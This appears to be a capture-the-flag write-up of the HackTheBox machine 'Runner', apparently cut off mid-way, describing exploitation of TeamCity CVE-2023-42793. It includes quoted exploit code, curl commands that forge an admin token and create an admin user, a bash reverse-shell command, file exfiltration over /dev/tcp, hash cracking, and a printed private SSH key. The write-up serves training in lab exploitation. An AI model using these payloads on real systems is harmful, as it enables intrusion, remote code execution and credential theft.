---
layout: writeup
category: HTB
description: Runner is a linux medium machine that teaches teamcity exploitation and portainer exploitation. First, I will abuse [CVE-2023-42793](https://nvd.nist.gov/vuln/detail/CVE-2023-42793) to have an admin token and have access to the teamcity's API. I will use this API to create an user and have access to the admin panel to retrieve some info.  Also, I will use this api to create a process that gives me a reverse shell to gain access as tcuser in a container. Then, I will see an id_rsa for john user and also a password for matthew in the hsql database of teamcity that is not useful by now. When I have access as john in runner machine, I can forward a portainer instance and reuse the matthew password seen before. From there, I will create a container with a mount of / that I will use to introduce my ssh pub key in root's authorized_keys and gain access as root in runner.
points: 30
solves: 
tags: teamcity cve-2023-42793 teamcity-api teamcity-rce hsql bcrypt hash-cracking id_rsa portainer
date: 2024-08-24
title: HTB Runner writeup
comments: false
---

{% raw %}

Runner is a linux medium machine that teaches teamcity exploitation and portainer exploitation. First, I will abuse [CVE-2023-42793](https://nvd.nist.gov/vuln/detail/CVE-2023-42793) to have an admin token and have access to the teamcity's API. I will use this API to create an user and have access to the admin panel to retrieve some info.  Also, I will use this api to create a process that gives me a reverse shell to gain access as tcuser in a container. Then, I will see an id_rsa for john user and also a password for matthew in the hsql database of teamcity that is not useful by now. When I have access as john in runner machine, I can forward a portainer instance and reuse the matthew password seen before. From there, I will create a container with a mount of / that I will use to introduce my ssh pub key in root's authorized_keys and gain access as root in runner.

# Enumeration

## Port scanning

I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```python
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.13 -oN tcpScan
# Nmap 7.94SVN scan initiated Tue Aug 20 16:56:47 2024 as: nmap -sSVC --open -p- --min-rate 5000 -v -n -Pn -oN runner 10.10.11.13
Nmap scan report for 10.10.11.13
Host is up (0.32s latency).
Not shown: 63434 closed tcp ports (reset), 2098 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http        nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://runner.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Aug 20 16:57:21 2024 -- 1 IP address (1 host up) scanned in 33.79 seconds
```

> [My used arguments for nmap](http://gabrielgonzalez211.github.io/blog/nmap-arguments.html)

There are 3 ports:

- Port 22: SSH
- Port 80: HTTP, its a nginx 1.18.0 server and it redirects to runner.htb, so I will add this to my /etc/hosts:

```plaintext
10.10.11.13 runner.htb
```

- Port 8000: HTTP. It detects its Nagios NSCA but its probably a false positive because the port number

# Port 8000

This returns a 404 not found page:

```bash
❯ curl -sS -i http://10.10.11.13:8000
HTTP/1.1 404 Not Found
Date: Wed, 21 Aug 2024 09:45:58 GMT
Content-Length: 9
Content-Type: text/plain; charset=utf-8

Not found
```

And fuzzing returns two pages, health and check:

```bash
❯ ffuf -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -u http://runner.htb:8000/FUZZ -mc all -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb:8000/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

health                  [Status: 200, Size: 3, Words: 1, Lines: 2, Duration: 323ms]
version                 [Status: 200, Size: 9, Words: 1, Lines: 1, Duration: 324ms]
:: Progress: [43007/43007] :: Job [1/1] :: 123 req/sec :: Duration: [0:05:54] :: Errors: 0 ::
```

Both doesn't return nothing interesting. `/health` is probably to check if the server is up:

```bash
❯ curl -sS -i http://10.10.11.13:8000/health
HTTP/1.1 200 OK
Date: Wed, 21 Aug 2024 10:14:35 GMT
Content-Length: 3
Content-Type: text/plain; charset=utf-8

OK
❯ curl -sS -i -X POST -d 'data=data' http://10.10.11.13:8000/health
HTTP/1.1 200 OK
Date: Wed, 21 Aug 2024 10:14:53 GMT
Content-Length: 3
Content-Type: text/plain; charset=utf-8

OK
```

And `/version` just returns a version string that doesn't seem real:

```bash
❯ curl -sS -i http://10.10.11.13:8000/version
HTTP/1.1 200 OK
Date: Wed, 21 Aug 2024 10:16:41 GMT
Content-Length: 9
Content-Type: text/plain; charset=utf-8

0.0.0-src
❯ curl -sS -i http://10.10.11.13:8000/version -X POST -d 'data=data'
HTTP/1.1 200 OK
Date: Wed, 21 Aug 2024 10:17:04 GMT
Content-Length: 9
Content-Type: text/plain; charset=utf-8

0.0.0-src
```

> Note: I tried POST method in case it was an API and it returns a different response but its not the case

Let's go for port 80

# Port 80         

Taking a look with curl, I can't see nothing that nmap hasn't detected:

```bash
❯ curl -sS -i http://10.10.11.13
HTTP/1.1 302 Moved Temporarily
Server: nginx/1.18.0 (Ubuntu)
Date: Tue, 20 Aug 2024 17:12:42 GMT
Content-Type: text/html
Content-Length: 154
Connection: keep-alive
Location: http://runner.htb/

<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
```

In the web I can see its just a landing page talking about a CI/CD:

![runner main page](/assets/images/Runner/runner-main-page.png)

## Subdomain enumeration

Fuzzing subdomains using subdomains-top1million-5000.txt doesn't discover nothing:

```bash
❯ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.runner.htb" -u http://runner.htb -fs 154 -mc all

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 154
________________________________________________

:: Progress: [4989/4989] :: Job [1/1] :: 111 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
```

However, this machine is a bit tricky because I have to fuzz with another dictionary (/opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt). The first time I have done this machine, I tried that because I didn't found anything in other place:

```bash
❯ ffuf -w /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.runner.htb" -u http://runner.htb -mc all -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://runner.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.runner.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 154
________________________________________________

teamcity                [Status: 401, Size: 66, Words: 8, Lines: 2, Duration: 333ms]
:: Progress: [100000/100000] :: Job [1/1] :: 122 req/sec :: Duration: [0:14:06] :: Errors: 0 ::
```

## Teamcity

I see a subdomain called teamcity so I will add it to my `/etc/hosts` file. With curl I can see it returns a 401 status and wants us to go to /login.html:

```bash
❯ curl -sS -i http://teamcity.runner.htb
HTTP/1.1 401 
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 21 Aug 2024 10:55:06 GMT
Content-Type: text/plain;charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive
TeamCity-Node-Id: MAIN_SERVER
WWW-Authenticate: Basic realm="TeamCity"
WWW-Authenticate: Bearer realm="TeamCity"
Cache-Control: no-store

Authentication required
To login manually go to "/login.html" page
```

Looking in the browser, it redirects directly to /login.html:

![teamcity main page](/assets/images/Runner/teamcity-main-pag.png)

That doesn't happen in curl because the User-Agent, if I specify the same than in my browser (I can view it with the network tab in devtools or intercepting in burpsuite), it also will happen:

```bash
❯ curl -sS -i http://teamcity.runner.htb -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0"
HTTP/1.1 302 
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 21 Aug 2024 12:28:32 GMT
Content-Length: 0
Connection: keep-alive
TeamCity-Node-Id: MAIN_SERVER
Set-Cookie: TCSESSIONID=8C0FE55E90334478774E38D43B155417; Path=/; HttpOnly
Location: /login.html
```

Leaving aside the user-agent, I can see its a Teamcity instance. Teamcity is a CI/CD just like said in the landing page (runner.htb):

![what is teamcity](/assets/images/Runner/what-is-teamcity.png)

I didn't know what was a CI/CD, so I searched in google and saw [this gitlab topic](https://about.gitlab.com/topics/ci-cd/) that explains it so well. Its a software that can be used for teams of developers to automate the code changes, deploy to production, etc:

![what is CI/CD](/assets/images/Runner/what-is-ci_cd.png)

If I manage to gain access to this, it would be so good because I would have the ability see the source code or if I have the permissions, even to run malicious code.

## CVE-2023-42793

Searching for vulnerabilities affecting to version 2023.05.3 (which I saw in the teamcity subdomain), I found [this blog post](https://www.sonarsource.com/blog/teamcity-vulnerability/) about a vulnerability that the Sonar’s Vulnerability Research Team has discovered that allows Unauthenticated RCE identified with CVE [CVE-2023-42793](https://nvd.nist.gov/vuln/detail/CVE-2023-42793):

![key information teamcity vulnerability](/assets/images/Runner/key-information-teamcity-vuln.png)

It consists on a authorization bypass because the use of wildcards to check the url and creating a admin token that can be used to create an admin account to access teamcity. 

However, this blog post is written to explain where the vulnerability was and not to exploit it, so I will inspect [this exploit](https://www.exploit-db.com/exploits/51884) to abuse it.

First, it checks if the url start with https:// and if true, the resulting curl command will be with `-k` that makes curl to not verify the ssl certificate:

```python
args = parser.parse_args()

url = args.url

if url.startswith("https://"):
    curl_command = "curl -k"
else:
    curl_command = "curl"
```

Then, it makes a POST request to /app/rest/users/id:1/tokens/RPC2 and it handles when the response status code is 200, 404 or 400. In case its 200, it creates a variable named `token`. If its 404 or 400, it does the same (I don't know why the exploit creator repeats the code instead of putting `elif status_code == 400 or status_code == 404`), it deletes the token by using the same url with the DELETE http method:

```python
get_token_url = f"{url}/app/rest/users/id:1/tokens/RPC2"
delete_token_url = f"{url}/app/rest/users/id:1/tokens/RPC2"
create_user_url = f"{url}/app/rest/users"

create_user_command = ""
token = ""

response = requests.post(get_token_url, verify=False)
if response.status_code == 200:
    match = re.search(r'value="([^"]+)"', response.text)
    if match:
        token = match.group(1)
        print(f"Token: {token}") 
    else:
        print("Token not found in the response")

elif response.status_code == 404:
    print("Token already exists")
    delete_command = f'{curl_command} -X DELETE {delete_token_url}'
    delete_process = subprocess.Popen(delete_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    delete_process.wait()
    delete_output = delete_process.communicate()
    if delete_process.returncode == 0:
        print("Previous token deleted successfully\nrun this command again for creating new token & admin user.")
    else:
        print("Failed to delete the previous token")
elif response.status_code == 400:
    print("Token already exists")
    delete_command = f'{curl_command} -X DELETE {delete_token_url}'
    delete_process = subprocess.Popen(delete_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    delete_process.wait()
    delete_output = delete_process.communicate()
    if delete_process.returncode == 0:
        print("Previous token deleted successfully\nrun this command again for creating new token & admin user.")
    else:
        print("Failed to delete the previous token")
else:
    print("Failed to get a token")
```

Then if the variable token exists, it creates a admin user with the acquired token in an "Authorization: Bearer" header using an API and sending as json (`requests.post(create_user_url, headers=headers, json=data)`) the username, password, email and roles (the ones required to be admin):

```python
if token:
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }
    random_chars = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(4))
    username = f"city_admin{random_chars}"
    data = {
        "username": username,
        "password": "Main_password!!**",
        "email": "angry-admin@funnybunny.org",
        "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}
    }
    create_user_command = f'{curl_command} --path-as-is -H "Authorization: Bearer {token}" -X POST {create_user_url} -H "Content-Type: application/json" --data \'{{"username": "{username}", "password": "theSecretPass!", "email": "nest@nest", "roles": {{"role": [{{"roleId": "SYSTEM_ADMIN", "scope": "g"}}]}}}}\''
    create_user_response = requests.post(create_user_url, headers=headers, json=data)
    if create_user_response.status_code == 200:
        print("Successfully exploited!")
        print(f"URL: {url}")
        print(f"Username: {username}")
        print("Password: Main_password!!**")
    else:
        print("Failed to create new admin user")
```

Now that I know how it works, I will create the token to access any functionality of the api:

```bash
❯ curl -sS -X POST -i http://teamcity.runner.htb/app/rest/users/id:1/tokens/RPC2
HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 21 Aug 2024 14:08:13 GMT
Content-Type: application/xml
Content-Length: 230
Connection: keep-alive
TeamCity-Node-Id: MAIN_SERVER
Cache-Control: no-store

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><token name="RPC2" creationTime="2024-08-21T14:08:12.588Z" value="eyJ0eXAiOiAiVENWMiJ9.ejRFN1ptazlJQU5MZEFrSk9QY1B5V2dOWXpN.NWFlNTRkYjQtMDRhNS00NThlLWFhNDctZDgyOThmNWY0ZjZm"/>
```

And create a user with admin privileges like in the script:

```bash
❯ curl -sS -X POST -i http://teamcity.runner.htb/app/rest/users -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.ZFVVb2k2OEVUUlV2b0Rtc3l4VGVCdlpWc1Jn.ZTQwYmU3NDItNjgzNS00MTNlLTg1YWYtMTQ4ZWY1ZmI5OWQw" -H "Content-Type: application/json" -d '{"username": "test", "email": "gabri@runner.htb", "password": "gabri123$!", "roles": {"role":[{"roleId": "SYSTEM_ADMIN", "scope":"g"}]}}'
HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 21 Aug 2024 20:42:08 GMT
Content-Type: application/xml
Content-Length: 670
Connection: keep-alive
TeamCity-Node-Id: MAIN_SERVER
Cache-Control: no-store

<?xml version="1.0" encoding="UTF-8" standalone="yes"?><user username="test" id="13" email="gabri@runner.htb" href="/app/rest/users/id:13"><properties count="3" href="/app/rest/users/id:13/properties"><property name="addTriggeredBuildToFavorites" value="true"/><property name="plugin:vcs:anyVcs:anyVcsRoot" value="test"/><property name="teamcity.server.buildNumber" value="129390"/></properties><roles><role roleId="SYSTEM_ADMIN" scope="g" href="/app/rest/users/id:13/roles/SYSTEM_ADMIN/g"/></roles><groups count="1"><group key="ALL_USERS_GROUP" name="All Users" href="/app/rest/userGroups/key:ALL_USERS_GROUP" description="Contains all TeamCity users"/></groups></user>
```

After logging in I have access to the teamcity panel:

![access teamcity panel](/assets/images/Runner/access-teamcity-panel.png)

Looking in Administration > Users, I can see the users john and matthew (appart from me):

![teamcity users](/assets/images/Runner/teamcity-users.png)

I will have them noted.

# Access as tcuser on 172.17.0.2

I will copy the things that [this exploit](https://packetstormsecurity.com/files/174860/JetBrains-TeamCity-Unauthenticated-Remote-Code-Execution.html) does to gain a reverse shell. Before retrieving the token, it modifies an internal.properties file to enable process creation by calling `modify_internal_properties(token, 'rest.debug.processes.enable', 'true')`:

```ruby
print_status('Modifying internal.properties to allow process creation...')

unless modify_internal_properties(token, 'rest.debug.processes.enable', 'true')
fail_with(Failure::UnexpectedReply, 'Failed to modify the internal.properties config file.')
end
```

That function makes a post request to /admin/dataDir.html using the token to modify the config/internal.properties with the content `key=value` that in this case it will be `rest.debug.processes.enable=true`:

```ruby
def modify_internal_properties(token, key, value)
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri('/admin/dataDir.html'),
      'headers' => {
        'Authorization' => "Bearer #{token}"
      },
      'vars_get' => {
        'action' => 'edit',
        'fileName' => 'config/internal.properties',
        'content' => value ? "#{key}=#{value}" : ''
      }
    )

    unless res&.code == 200
      # If we are using an authentication for a non admin user, we cannot modify the internal.properties file. The
      # server will return a 302 redirect if this is the case. Choose a different TEAMCITY_ADMIN_ID and try again.
      if res&.code == 302
        print_warning('This user is not an administrator, try setting the TEAMCITY_ADMIN_ID option to a different ID.')
      end

      return false
    end

    # <..SNIP..>
end
```

After modifying the internal.properties, it finally makes the request to create a process that sends a reverse shell:

```ruby
begin
    print_status('Executing payload...')

    vars_get = {}

    # We need to supply multiple params with the same name, so the TeamCity server (A Java Spring framework) can
    # construct a List<String> sequence for multiple parameters. We can do this be enabling `compare_by_identity`
    # in the Ruby Hash.
    vars_get.compare_by_identity

    case target['Platform']
    when 'win'
        vars_get['exePath'] = 'cmd.exe'
        vars_get['params'] = '/c'
        vars_get['params'] = payload.encoded
    when 'linux'
        vars_get['exePath'] = '/bin/sh'
        vars_get['params'] = '-c'
        vars_get['params'] = payload.encoded
    end

    res = send_request_cgi(
        'method' => 'POST',
        'uri' => normalize_uri('/app/rest/debug/processes'),
        'uri_encode_mode' => 'hex-all', # we must encode all characters in the query param for the payload to work.
        'headers' => {
            'Authorization' => "Bearer #{token}",
            'Content-Type' => 'text/plain'
        },
        'vars_get' => vars_get
    )

    unless res&.code == 200
        fail_with(Failure::UnexpectedReply, 'Failed to execute arbitrary process.')
    end
    ensure
    print_status('Resetting the internal.properties settings...')

    unless modify_internal_properties(token, 'rest.debug.processes.enable', nil)
        fail_with(Failure::UnexpectedReply, 'Failed to modify the internal.properties config file.')
    end
end
```

Now that I understand it, I will start by modifying the internal.properties:

```bash
❯ curl -sS -i http://teamcity.runner.htb/admin/dataDir.html -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.ejRFN1ptazlJQU5MZEFrSk9QY1B5V2dOWXpN.NWFlNTRkYjQtMDRhNS00NThlLWFhNDctZDgyOThmNWY0ZjZm" -X POST --data 'action=edit&fileName=config/internal.properties&content=rest.debug.processes.enable=true'
HTTP/1.1 200 
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 21 Aug 2024 17:33:11 GMT
Content-Type: text/plain
Content-Length: 0
Connection: keep-alive
TeamCity-Node-Id: MAIN_SERVER
Cache-Control: no-store
X-Content-Type-Options: nosniff
```

It seems to have worked. the only thing left is to start a nc listener and create the process that gives me a reverse shell:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

```bash
❯ curl -sS -i 'http://teamcity.runner.htb/app/rest/debug/processes' -H "Authorization: Bearer eyJ0eXAiOiAiVENWMiJ9.X2RkS1ZKczMtdk03SHM3ZDRKdjFheF9OZHBN.YjA3NTUyZTEtM2YzNS00YjM1LTk2Y2ItNzkwODJmZmYxNmZl" -H "Content-Type: text/plain" -G --data-urlencode 'exePath=/bin/bash' --data-urlencode 'params=-c' --data-urlencode 'params=bash -i >& /dev/tcp/10.10.14.106/443 0>&1' -X POST
```

And I receive a shell as tcuser in a container:

![shell received as tcuser on container](/assets/images/Runner/shell-received-as-tcuser-in-container.png)

Now I will do the tty treatment to have a completely interactive shell where I can do ctrl+c and ctrl+l among other things:

```bash
tcuser@647a82f29ca0:~/bin$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
   Welcome to TeamCity Server Docker container

 * Installation directory: /opt/teamcity
 * Logs directory:         /opt/teamcity/logs
 * Data directory:         /data/teamcity_server/datadir

   TeamCity will be running under 'tcuser' user (1000/1000)

tcuser@647a82f29ca0:~/bin$ ^Z
[1]  + 746936 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 746936 continued  nc -lvnp 443
                                     reset xterm
tcuser@647a82f29ca0:~/bin$ export TERM=xterm
tcuser@647a82f29ca0:~/bin$ export SHELL=bash
tcuser@647a82f29ca0:~/bin$ stty rows 50 cols 184
```

* `script /dev/null -c bash`: Spawns a tty.
* `ctrl+z`: puts the shell in background for later doing a treatment.
* `stty raw -echo;fg`: gives the shell back again.
* `reset xterm`: resets the terminal to give the bash console.
* `export TERM=xterm`: let do ctrl+l to clean the terminal.
* `export SHELL=bash`: specifies the system that it's using a bash console.
* `stty rows <YOUR ROWS> cols <YOUR COLUMNS>`: sets the size of the current full terminal window. It is possible to view the right size for your window running `stty size` in a entire new window on your terminal.

To enumerate the credentials of the registered users in teamcity, I will see its using a HSQLDB file to access the database in `/data/teamcity_server/datadir/config/database.properties`:

```bash
tcuser@647a82f29ca0:/data/teamcity_server/datadir/config$ cat database.properties
#Wed Feb 28 10:37:02 GMT 2024
connectionUrl=jdbc\:hsqldb\:file\:$TEAMCITY_SYSTEM_PATH/buildserver
```

Reading the [hsql documentation](https://www.hsqldb.org/doc/2.0/guide/running-chapt.html#rgc_hsqldb_db), I can see that a specified file consists in various files like ".properties", ".data", ".log", etc:

![hsql file consists in various files](/assets/images/Runner/hsql-file-consists-in-various-files.png)

So I will search recursively for these files with find:

```bash
tcuser@647a82f29ca0:/data/teamcity_server/datadir/config$ find / -name buildserver\* 2>/dev/null
/data/teamcity_server/datadir/system/buildserver.log
/data/teamcity_server/datadir/system/buildserver.tmp
/data/teamcity_server/datadir/system/buildserver.properties
/data/teamcity_server/datadir/system/buildserver.script
/data/teamcity_server/datadir/system/buildserver.lck
/data/teamcity_server/datadir/system/buildserver.data
```

And I can see they are in /data/teamcity_server/datadir/system directory. I will download the .data to my machine as its the most interesting:

**Attacker**
```bash
❯ nc -lvnp 443 > buildserver.data
listening on [any] 443 ...
```


**Victim**
```bash
tcuser@647a82f29ca0:/data/teamcity_server/datadir/config$ cat  /data/teamcity_server/datadir/system/buildserver.data > /dev/tcp/10.10.14.106/443
```

Just doing a strings to the file shows the password hashes for the users:

```bash
❯ strings buildserver.data | less
```
![password hashes in database](/assets/images/Runner/password-hashes-in-.data-database-file.png)

The others are users created by me and other machine players so the relevant users are john and matthew. I will put each user with its hash in a separate file to run hashcat for each user separately. I will create matthew.hash and john.hash. The crackable hash is the matthew's one and the john's hash doesn't crack:

```bash
> hashcat -m 3200 matthew.hash rockyou.txt
hashcat (v6.2.6) starting

<..SNIP..>
$2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGLulmeVo.Em:piper123

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$07$q.m8WQP8niXODv55lJVovOmxGtg6K/YPHbD48/JQsdGL...eVo.Em
Time.Started.....: Thu Aug 22 10:18:50 2024 (1 min, 9 secs)
Time.Estimated...: Thu Aug 22 10:19:59 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      757 H/s (8.78ms) @ Accel:2 Loops:8 Thr:8 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 52080/14344385 (0.36%)
Rejected.........: 0/52080 (0.00%)
Restore.Point....: 51968/14344385 (0.36%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:120-128
Candidate.Engine.: Device Generator
Candidates.#1....: rockbaby -> nichole3
Hardware.Mon.#1..: Util: 97% Core: 400MHz Mem:1500MHz Bus:16

Started: Thu Aug 22 10:18:45 2024
Stopped: Thu Aug 22 10:20:00 2024
```

The password for matthew is piper123 but it doesn't work for ssh as matthew or john:

```bash
❯ ssh matthew@runner.htb
matthew@runner.htb's password: piper123
Permission denied, please try again.
```
```bash
❯ ssh john@runner.htb
john@runner.htb's password: piper123
Permission denied, please try again.
```

For now, there is no other interesting place to reuse this password because I already gained access as the user that runs teamcity, so I will look other things


# Access as john in runner

The teamcity_server folder I saw before is probably to store the data of teamcity.

In /data/teamcity_server/datadir, the most interesting folder is `config`, so I will look files inside it:

```bash
tcuser@647a82f29ca0:/data/teamcity_server/datadir$ find config/ -type f | grep -vE '\.ftl|\.dist$|_logging'
config/auth-config.dtd
config/backup-config.xml
config/roles-config.xml
config/_trash/AllProjects.project1/project-config.xml
config/ntlm-config.properties
config/main-config.xml
config/main-config.dtd
config/roles-config.dtd
config/_auth/auth-preset.dtd
config/_auth/ldap.xml
config/_auth/ldap-ntlm.xml
config/_auth/default.xml
config/_auth/nt-domain.xml
config/auth-config.xml
config/database.properties
config/_notifications/email/email-config.dtd
config/_notifications/email/email-config.xml
config/nodes-config.xml
config/projects/_Root/project-config.xml
config/projects/Asdas/buildTypes/Asdas_Asdss.xml.1
config/projects/Asdas/buildTypes/Asdas_Asdss.xml.2
config/projects/Asdas/buildTypes/Asdas_Asdss.xml
config/projects/Asdas/project-config.xml
config/projects/AllProjects/pluginData/ssh_keys/id_rsa
config/projects/AllProjects/project-config.xml.1
config/projects/AllProjects/project-config.xml
config/internal.properties
config/ldap-mapping.dtd
config/disabled-plugins.xml
```

There is a id_rsa in `config/projects/AllProjects/pluginData/ssh_keys/id_rsa`, testing it with the users I saw before, it works with john:

```bash
❯ /bin/cat teamcity-id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAlk2rRhm7T2dg2z3+Y6ioSOVszvNlA4wRS4ty8qrGMSCpnZyEISPl
htHGpTu0oGI11FTun7HzQj7Ore7YMC+SsMIlS78MGU2ogb0Tp2bOY5RN1/X9MiK/SE4liT
njhPU1FqBIexmXKlgS/jv57WUtc5CsgTUGYkpaX6cT2geiNqHLnB5QD+ZKJWBflF6P9rTt
zkEdcWYKtDp0Phcu1FUVeQJOpb13w/L0GGiya2RkZgrIwXR6l3YCX+mBRFfhRFHLmd/lgy
/R2GQpBWUDB9rUS+mtHpm4c3786g11IPZo+74I7BhOn1Iz2E5KO0tW2jefylY2MrYgOjjq
5fj0Fz3eoj4hxtZyuf0GR8Cq1AkowJyDP02XzIvVZKCMDgVNAMH5B7COTX8CjUzc0vuKV5
iLSi+vRx6vYQpQv4wlh1H4hUlgaVSimoAqizJPUqyAi9oUhHXGY71x5gCUXeULZJMcDYKB
Z2zzex3+iPBYi9tTsnCISXIvTDb32fmm1qRmIRyXAAAFgGL91WVi/dVlAAAAB3NzaC1yc2
EAAAGBAJZNq0YZu09nYNs9/mOoqEjlbM7zZQOMEUuLcvKqxjEgqZ2chCEj5YbRxqU7tKBi
NdRU7p+x80I+zq3u2DAvkrDCJUu/DBlNqIG9E6dmzmOUTdf1/TIiv0hOJYk544T1NRagSH
sZlypYEv47+e1lLXOQrIE1BmJKWl+nE9oHojahy5weUA/mSiVgX5Rej/a07c5BHXFmCrQ6
dD4XLtRVFXkCTqW9d8Py9BhosmtkZGYKyMF0epd2Al/pgURX4URRy5nf5YMv0dhkKQVlAw
fa1EvprR6ZuHN+/OoNdSD2aPu+COwYTp9SM9hOSjtLVto3n8pWNjK2IDo46uX49Bc93qI+
IcbWcrn9BkfAqtQJKMCcgz9Nl8yL1WSgjA4FTQDB+Qewjk1/Ao1M3NL7ileYi0ovr0cer2
EKUL+MJYdR+IVJYGlUopqAKosyT1KsgIvaFIR1xmO9ceYAlF3lC2STHA2CgWds83sd/ojw
WIvbU7JwiElyL0w299n5ptakZiEclwAAAAMBAAEAAAGABgAu1NslI8vsTYSBmgf7RAHI4N
BN2aDndd0o5zBTPlXf/7dmfQ46VTId3K3wDbEuFf6YEk8f96abSM1u2ymjESSHKamEeaQk
lJ1wYfAUUFx06SjchXpmqaPZEsv5Xe8OQgt/KU8BvoKKq5TIayZtdJ4zjOsJiLYQOp5oh/
1jCAxYnTCGoMPgdPKOjlViKQbbMa9e1g6tYbmtt2bkizykYVLqweo5FF0oSqsvaGM3MO3A
Sxzz4gUnnh2r+AcMKtabGye35Ax8Jyrtr6QAo/4HL5rsmN75bLVMN/UlcCFhCFYYRhlSay
yeuwJZVmHy0YVVjxq3d5jiFMzqJYpC0MZIj/L6Q3inBl/Qc09d9zqTw1wAd1ocg13PTtZA
mgXIjAdnpZqGbqPIJjzUYua2z4mMOyJmF4c3DQDHEtZBEP0Z4DsBCudiU5QUOcduwf61M4
CtgiWETiQ3ptiCPvGoBkEV8ytMLS8tx2S77JyBVhe3u2IgeyQx0BBHqnKS97nkckXlAAAA
wF8nu51q9C0nvzipnnC4obgITpO4N7ePa9ExsuSlIFWYZiBVc2rxjMffS+pqL4Bh776B7T
PSZUw2mwwZ47pIzY6NI45mr6iK6FexDAPQzbe5i8gO15oGIV9MDVrprjTJtP+Vy9kxejkR
